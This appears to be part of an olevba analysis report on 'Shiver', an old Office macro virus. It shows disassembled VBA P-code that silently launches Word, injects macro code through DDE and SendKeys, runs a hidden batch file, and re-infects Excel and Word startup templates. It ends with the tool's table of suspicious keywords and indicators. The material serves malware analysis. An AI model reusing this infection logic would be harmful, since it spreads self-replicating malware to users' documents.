' 	LitDI2 0x012C 
' 	Mul 
' 	FnInt 
' 	Ld Selection 
' 	MemLd ShapeRange 
' 	ArgsMemCall IncrementTop 0x0001 
' Line #249:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	NextVar 
' Line #250:
' 	EndIfBlock 
' Line #251:
' 	EndSub 
' Line #252:
' Line #253:
' Line #254:
' 	FuncDefn (Sub Auto_Close())
' Line #255:
' Line #256:
' 	OnError out 
' Line #257:
' Line #258:
' 	ArgsCall (Call) CheckMarker 0x0000 
' Line #259:
' Line #260:
' 	LitStr 0x0007 "OpusApp"
' 	ArgsLd FindApp 0x0001 
' 	St hWnd 
' Line #261:
' Line #262:
' 	Ld hWnd 
' 	LitDI2 0x0000 
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St WordFound 
' 	EndIf 
' Line #263:
' Line #264:
' 	Ld WordFound 
' 	LitVarSpecial (False)
' 	Eq 
' 	Ld Marker 
' 	LitVarSpecial (False)
' 	Eq 
' 	And 
' 	IfBlock 
' Line #265:
' Line #266:
' 	Ld Application 
' 	MemLd Path 
' 	LitStr 0x000C "\winword.exe"
' 	Concat 
' 	Ld vbMinimizedFocus 
' 	ArgsCall Shell 0x0002 
' Line #267:
' 	LitStr 0x0006 "MSWord"
' 	LitStr 0x0006 "system"
' 	Ld Application 
' 	ArgsMemLd DDEInitiate 0x0002 
' 	St CNL 
' Line #268:
' 	Ld CNL 
' 	LitStr 0x000B "[fileclose]"
' 	Ld Application 
' 	ArgsMemCall DDEExecute 0x0002 
' Line #269:
' 	Ld CNL 
' 	LitStr 0x0013 "[Sendkeys "%{F11}"]"
' 	Ld Application 
' 	ArgsMemCall DDEExecute 0x0002 
' Line #270:
' 	Ld CNL 
' 	LitStr 0x000F "[Sendkeys "^m"]"
' 	Ld Application 
' 	ArgsMemCall DDEExecute 0x0002 
' Line #271:
' 	ArgsCall (Call) delay 0x0000 
' Line #272:
' 	LitStr 0x000D "c:\shiver.sys"
' 	Ld Wait 
' 	ArgsCall SendKeys 0x0002 
' Line #273:
' 	LitStr 0x0002 "%o"
' 	ArgsCall SendKeys 0x0001 
' Line #274:
' 	Ld CNL 
' 	LitStr 0x0012 "[Sendkeys "%{F4}"]"
' 	Ld Application 
' 	ArgsMemCall DDEExecute 0x0002 
' Line #275:
' 	Ld CNL 
' 	LitStr 0x0012 "[Sendkeys "%{F4}"]"
' 	Ld Application 
' 	ArgsMemCall DDEExecute 0x0002 
' Line #276:
' 	Ld CNL 
' 	LitStr 0x000E "[Sendkeys "y"]"
' 	Ld Application 
' 	ArgsMemCall DDEExecute 0x0002 
' Line #277:
' 	Ld CNL 
' 	Ld Application 
' 	ArgsMemCall DDETerminate 0x0001 
' Line #278:
' Line #279:
' 	ArgsCall (Call) MakeMarker 0x0000 
' Line #280:
' Line #281:
' 	LitVarSpecial (True)
' 	St JustRun 
' Line #282:
' Line #283:
' 	EndIfBlock 
' Line #284:
' Line #285:
' 	Label out 
' Line #286:
' Line #287:
' 	OnError (Resume Next) 
' Line #288:
' 	LitStr 0x0009 "c:\o6.bat"
' 	Ld vbHide 
' 	ArgsCall Shell 0x0002 
' Line #289:
' Line #290:
' 	Ld Rnd 
' 	LitDI2 0x001E 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0005 
' 	Eq 
' 	Paren 
' 	If 
' 	BoSImplicit 
' 	ArgsCall (Call) xlReEvalInfection 0x0000 
' 	EndIf 
' Line #291:
' Line #292:
' 	EndSub 
' Line #293:
' Line #294:
' 	FuncDefn (Sub delay())
' Line #295:
' 	ArgsLd Now 0x0000 
' 	ArgsLd Hour 0x0001 
' 	St newHour 
' Line #296:
' 	ArgsLd Now 0x0000 
' 	ArgsLd Minute 0x0001 
' 	St newMinute 
' Line #297:
' 	ArgsLd Now 0x0000 
' 	ArgsLd Second 0x0001 
' 	LitDI2 0x0002 
' 	Add 
' 	St newSecond 
' Line #298:
' 	Ld newHour 
' 	Ld newMinute 
' 	Ld newSecond 
' 	ArgsLd TimeSerial 0x0003 
' 	St waitTime 
' Line #299:
' 	Ld waitTime 
' 	Ld Application 
' 	ArgsMemCall Wait 0x0001 
' Line #300:
' 	EndSub 
' Line #301:
' Line #302:
' 	FuncDefn (Sub wdReEvalInfection())
' Line #303:
' 	Ld Application 
' 	MemLd Path 
' 	LitStr 0x0015 "\xlstart\personal.xls"
' 	Add 
' 	ArgsLd Dir 0x0001 
' 	ArgsLd UCase 0x0001 
' 	LitStr 0x000C "PERSONAL.XLS"
' 	Ne 
' 	Ld Marker 
' 	LitVarSpecial (True)
' 	Eq 
' 	And 
' 	Ld JustRun 
' 	LitVarSpecial (True)
' 	Ne 
' 	And 
' 	IfBlock 
' Line #304:
' 	LitStr 0x0006 "NoNoNo"
' 	LitStr 0x0000 ""
' 	LitStr 0x0041 "HKEY_CURRENT_USER\Software\VB and VBA Program Settings\Office\8.0"
' 	LitStr 0x000B "Shiver[DDE]"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #305:
' 	EndIfBlock 
' Line #306:
' 	EndSub 
' Line #307:
' Line #308:
' 	FuncDefn (Sub xlReEvalInfection())
' Line #309:
' 	Ld Application 
' 	MemLd Path 
' 	LitStr 0x0012 "\startup\Word8.dot"
' 	Concat 
' 	ArgsLd Dir 0x0001 
' 	ArgsLd UCase 0x0001 
' 	LitStr 0x0009 "WORD8.DOT"
' 	Ne 
' 	Ld Marker 
' 	LitVarSpecial (True)
' 	Eq 
' 	And 
' 	Ld JustRun 
' 	LitVarSpecial (True)
' 	Ne 
' 	And 
' 	IfBlock 
' Line #310:
' 	LitStr 0x0006 "Office"
' 	LitStr 0x0003 "8.0"
' 	LitStr 0x000B "Shiver[DDE]"
' 	LitStr 0x0006 "NoNoNo"
' 	ArgsCall SaveSetting 0x0004 
' Line #311:
' 	EndIfBlock 
' Line #312:
' 	EndSub 
' Line #313:
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExit            |Runs when the Word document is closed        |
|AutoExec  |Auto_Open           |Runs when the Excel Workbook is opened       |
|AutoExec  |Auto_Close          |Runs when the Excel Workbook is closed       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbHide              |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbMinimizedFocus    |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Run                 |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Command             |May run PowerShell commands                  |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|FindWindow          |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Lib                 |May run code from a DLL                      |
|Suspicious|Sendkeys            |May control another application by simulating|
|          |                    |user keystrokes                              |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|system              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |Excel.exe           |Executable file name                         |
|IOC       |Application.VBE     |Executable file name                         |
|IOC       |o6.reg              |Executable file name                         |
|IOC       |O6.REG              |Executable file name                         |
|IOC       |o6.bat              |Executable file name                         |
|IOC       |O6.BAT              |Executable file name                         |
|IOC       |winword.exe         |Executable file name                         |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

